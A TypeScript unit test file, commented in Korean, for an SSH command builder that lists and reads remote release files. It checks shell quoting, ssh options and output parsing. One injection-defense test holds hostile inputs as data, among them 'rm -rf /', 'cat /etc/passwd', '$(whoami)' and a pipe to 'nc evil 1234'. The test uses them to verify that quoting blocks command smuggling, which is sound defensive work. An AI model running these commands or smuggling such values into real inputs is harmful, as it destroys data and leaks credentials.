import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  buildSshArgs,
  existsCommand,
  joinRemote,
  listDirsCommand,
  listFilesCommand,
  parseDirListing,
  parseFileSizes,
  quoteRemotePath,
  readFileCommand,
  shellQuote,
  sshOptions,
} from '../server/source/sshCommands.ts'
import { readSourceConfig } from '../server/codeRepositoryPlugin.ts'
import type { SshSourceConfig } from '../src/types.ts'

/**
 * SSH 명령 조립은 전부 순수 함수라 실제 접속 없이 검증한다.
 * (실제 ssh 실행은 execFile 이라는 외부 경계라 여기서 다루지 않는다)
 */

const CONN: SshSourceConfig = {
  mode: 'ssh',
  auth: 'key',
  host: 'build-01',
  port: null,
  user: 'deploy',
  identityFile: '',
  root: '/home/deploy/release',
  encoding: 'auto',
}

/* ---------------- 셸 인용 (주입 방어) ---------------- */

test('작은따옴표로 감싸고 내부 따옴표를 escape 한다', () => {
  assert.equal(shellQuote('plain'), "'plain'")
  assert.equal(shellQuote("it's"), "'it'\\''s'")
  assert.equal(shellQuote('a b'), "'a b'")
})

test('셸 메타문자가 명령으로 새어 나가지 않는다', () => {
  const attacks = [
    '/tmp; rm -rf /',
    '/tmp && cat /etc/passwd',
    '/tmp$(whoami)',
    '/tmp`id`',
    '/tmp|nc evil 1234',
    '/tmp\nrm -rf /',
  ]
  for (const attack of attacks) {
    const quoted = shellQuote(attack)
    // 통째로 한 쌍의 작은따옴표 안에 들어가고, 내부에 escape 되지 않은 따옴표가 없어야 한다
    assert.ok(quoted.startsWith("'") && quoted.endsWith("'"), attack)
    assert.equal(quoted.slice(1, -1).includes("'"), attack.includes("'"), attack)
  }
})

/* ---------------- 틸드(홈) 경로 ---------------- */

test('선행 ~ 는 원격에서 확장되도록 따옴표 밖에 둔다', () => {
  // 작은따옴표 안에 넣으면 셸이 ~ 를 확장하지 않아 리터럴 경로가 되어 버린다
  assert.equal(quoteRemotePath('~/release'), `"$HOME"/'release'`)
  assert.equal(quoteRemotePath('~'), '"$HOME"')
  assert.equal(quoteRemotePath('~build/release'), "~build/'release'")
  assert.equal(quoteRemotePath('~build'), '~build')
})

test('틸드 모양이 아니면 통째로 인용한다', () => {
  assert.equal(quoteRemotePath('/abs/path'), "'/abs/path'")
  assert.equal(quoteRemotePath('rel/path'), "'rel/path'")
  // `~$(id)` 처럼 안전 문자셋을 벗어나면 확장을 허용하지 않는다
  assert.equal(quoteRemotePath('~$(id)/x'), "'~$(id)/x'")
})

/* ---------------- 경로 잇기 ---------------- */

test('원격 경로를 이을 때 슬래시가 중복되지 않는다', () => {
  assert.equal(joinRemote('/a', 'b'), '/a/b')
  assert.equal(joinRemote('/a/', 'b'), '/a/b')
  assert.equal(joinRemote('/a//', 'b', 'c/d'), '/a/b/c/d')
  assert.equal(joinRemote('/a'), '/a')
  assert.equal(joinRemote('/a', ''), '/a')
})

/* ---------------- ssh 옵션 ---------------- */

test('비밀번호를 절대 묻지 않도록 BatchMode 를 강제한다', () => {
  // 프롬프트가 뜨면 개발 서버가 통째로 멈춘다
  const opts = sshOptions(CONN)
  assert.ok(opts.includes('BatchMode=yes'))
  assert.ok(opts.some((o) => o.startsWith('ConnectTimeout=')))
})

test('포트·개인키는 지정했을 때만 붙는다', () => {
  assert.ok(!sshOptions(CONN).includes('-p'))
  assert.ok(!sshOptions(CONN).includes('-i'))

  const full = sshOptions({ ...CONN, port: 2222, identityFile: '/keys/id_ed25519' })
  assert.equal(full[full.indexOf('-p') + 1], '2222')
  assert.equal(full[full.indexOf('-i') + 1], '/keys/id_ed25519')
})

test('argv 는 [옵션..., user@host, 원격명령] 순서다', () => {
  const args = buildSshArgs(CONN, 'ls -1F')
  assert.equal(args[args.length - 2], 'deploy@build-01')
  assert.equal(args[args.length - 1], 'ls -1F')
})

test('호스트 키를 자동 수락하지도, 물어보지도 않는다', () => {
  // 자동 수락은 중간자 공격을 막지 못한다.
  // 묻지 않는 것도 중요하다 — 비밀번호 인증에서는 그 질문이 askpass 로 가고,
  // askpass 는 문구를 보지 않고 비밀번호를 답한다 (askpass.test.ts 참고).
  for (const auth of ['key', 'password'] as const) {
    const joined = sshOptions({ ...CONN, auth }).join(' ')
    assert.ok(joined.includes('StrictHostKeyChecking=yes'), auth)
    assert.equal(/StrictHostKeyChecking=(no|accept-new)/.test(joined), false, auth)
  }
})

/* ---------------- 원격 명령 ---------------- */

test('원격 명령에 경로가 인용된 채로 들어간다', () => {
  assert.equal(listDirsCommand('/home/a b'), "ls -1F -- '/home/a b'")
  assert.equal(readFileCommand('/x/y.pc'), "cat -- '/x/y.pc'")
  assert.equal(existsCommand('/x'), "if test -d '/x'; then echo __OK__; else echo __NO__; fi")
  assert.ok(listFilesCommand('/x').startsWith("find '/x' -type f"))
})

test('존재 확인은 결과를 종료 코드가 아니라 표준출력으로 알린다', () => {
  // `test -d X && echo` 는 경로가 없으면 exit 1 이라 접속 실패와 구분되지 않는다.
  // if/else 로 항상 정상 종료해야 "접속 실패"와 "경로 없음"을 나눌 수 있다.
  const cmd = existsCommand('/x')
  assert.ok(cmd.startsWith('if '))
  assert.ok(cmd.includes('__OK__') && cmd.includes('__NO__'))
  assert.ok(cmd.trimEnd().endsWith('fi'))
})

test('파일 목록은 GNU 전용 옵션을 쓰지 않는다', () => {
  // -printf(GNU) / stat -c(GNU) 는 AIX·Solaris 에 없다
  const cmd = listFilesCommand('/x')
  assert.ok(!cmd.includes('-printf'))
  assert.ok(!cmd.includes('-maxdepth'))
  assert.ok(cmd.includes('-exec wc -c {} +'))
})

/* ---------------- 출력 파싱 ---------------- */

test('ls -1F 출력에서 디렉터리만 뽑는다', () => {
  const stdout = ['2026-08-01/', '2026-09-01/', 'README.txt', 'run*', 'latest@', ''].join('\n')
  assert.deepEqual(parseDirListing(stdout), ['2026-08-01', '2026-09-01'])
})

test('CRLF 로 와도 디렉터리를 알아본다', () => {
  assert.deepEqual(parseDirListing('a/\r\nb/\r\nc.txt\r\n'), ['a', 'b'])
})

test('wc -c 출력을 상대 경로와 크기로 바꾼다', () => {
  const stdout = [
    '     120 /rel/2026-08-01/ord/ord_create.pc',
    '      45 /rel/2026-08-01/pay/pay_approve.pc',
    '     165 total',
  ].join('\n')

  assert.deepEqual(parseFileSizes(stdout, '/rel/2026-08-01'), [
    { path: 'ord/ord_create.pc', size: 120 },
    { path: 'pay/pay_approve.pc', size: 45 },
  ])
})

test('total 줄과 범위 밖 경로는 걸러낸다', () => {
  const stdout = [
    '  10 /rel/2026-08-01/a.pc',
    '  99 total',
    '  20 /other/b.pc', // 다른 폴더 — 섞여 들어오면 안 된다
    '',
  ].join('\n')
  assert.deepEqual(parseFileSizes(stdout, '/rel/2026-08-01'), [{ path: 'a.pc', size: 10 }])
})

test('경로에 공백이 있어도 끊기지 않는다', () => {
  const stdout = '  7 /rel/d/ord/my file.pc'
  assert.deepEqual(parseFileSizes(stdout, '/rel/d'), [{ path: 'ord/my file.pc', size: 7 }])
})

test('스냅샷 폴더 끝의 슬래시는 있으나 없으나 같다', () => {
  const stdout = '  5 /rel/d/a.pc'
  assert.deepEqual(parseFileSizes(stdout, '/rel/d/'), [{ path: 'a.pc', size: 5 }])
})

test('빈 출력·잡음은 빈 목록', () => {
  for (const stdout of ['', '\n\n', 'find: cannot read directory', '  총 0']) {
    assert.deepEqual(parseFileSizes(stdout, '/rel/d'), [], JSON.stringify(stdout))
  }
})

/* ---------------- 요청 → 소스 설정 ---------------- */

const q = (s: string): URLSearchParams => new URLSearchParams(s)

test('mode 가 없으면 로컬로 본다 (설정 저장 전에도 동작해야 한다)', () => {
  assert.deepEqual(readSourceConfig(q('')), { mode: 'local', root: '', encoding: 'auto' })
  assert.deepEqual(readSourceConfig(q('root=D%3A%2Frel')), {
    mode: 'local',
    root: 'D:/rel',
    encoding: 'auto',
  })
})

test('인코딩 파라미터를 읽고, 모르는 값은 자동으로 둔다', () => {
  assert.equal(readSourceConfig(q('encoding=euc-kr')).encoding, 'euc-kr')
  assert.equal(readSourceConfig(q('encoding=utf-8')).encoding, 'utf-8')
  for (const raw of ['', 'cp949', 'shift_jis', 'AUTO']) {
    assert.equal(readSourceConfig(q(`encoding=${raw}`)).encoding, 'auto', raw)
  }
})

test('ssh 파라미터를 설정으로 읽는다', () => {
  const config = readSourceConfig(
    q('mode=ssh&host=h&user=u&root=%2Frel&port=2222&identityFile=%2Fk%2Fid')
  )
  assert.deepEqual(config, {
    mode: 'ssh',
    auth: 'key',
    host: 'h',
    port: 2222,
    user: 'u',
    identityFile: '/k/id',
    root: '/rel',
    encoding: 'auto',
  })
})

test('포트가 숫자가 아니면 기본값(null)으로 둔다', () => {
  for (const raw of ['abc', '0', '-1', '']) {
    const config = readSourceConfig(q(`mode=ssh&host=h&user=u&root=%2Fr&port=${raw}`))
    assert.equal(config.mode === 'ssh' && config.port, null, raw)
  }
})

/* ---------------- 비밀번호 인증 옵션 ---------------- */

const PW: SshSourceConfig = { ...CONN, auth: 'password' }

test('비밀번호 인증에서는 BatchMode 를 켜지 않는다', () => {
  // BatchMode=yes 면 askpass 까지 막혀 비밀번호를 넘길 방법이 없어진다
  const opts = sshOptions(PW)
  assert.ok(!opts.includes('BatchMode=yes'))
  assert.ok(opts.includes('BatchMode=no'))
})

test('비밀번호 인증은 키를 먼저 시도하지 않는다', () => {
  // 키를 먼저 타면 키 암호를 묻다가 멈추거나 엉뚱하게 실패한다
  const opts = sshOptions(PW)
  assert.ok(opts.includes('PubkeyAuthentication=no'))
  assert.ok(opts.includes('PreferredAuthentications=password,keyboard-interactive'))
})

test('비밀번호가 틀리면 한 번만 시도하고 끝낸다', () => {
  // 기본 3회 재시도는 프롬프트가 없는 환경에서 그냥 지연만 만든다
  assert.ok(sshOptions(PW).includes('NumberOfPasswordPrompts=1'))
})

test('키 인증은 예전처럼 BatchMode 로 잠근다', () => {
  const opts = sshOptions(CONN)
  assert.ok(opts.includes('BatchMode=yes'))
  assert.ok(!opts.includes('PubkeyAuthentication=no'))
})

test('argv 어디에도 비밀번호가 실리지 않는다', () => {
  // 명령줄에 넣으면 `ps` 로 다른 사용자에게 보인다 — 환경변수로만 넘겨야 한다
  const args = buildSshArgs(PW, 'ls')
  assert.ok(!args.some((a) => /password=|passwd|pw=/i.test(a)))
})

test('auth 파라미터를 읽는다', () => {
  assert.equal(readSourceConfig(q('mode=ssh&host=h&user=u&root=%2Fr&auth=password')).mode === 'ssh' &&
    (readSourceConfig(q('mode=ssh&host=h&user=u&root=%2Fr&auth=password')) as SshSourceConfig).auth,
    'password')
  // 모르는 값은 안전한 쪽(키)으로 둔다
  for (const raw of ['', 'kerberos', 'PASSWORD']) {
    const c = readSourceConfig(q(`mode=ssh&host=h&user=u&root=%2Fr&auth=${raw}`))
    assert.equal(c.mode === 'ssh' && c.auth, 'key', raw)
  }
})
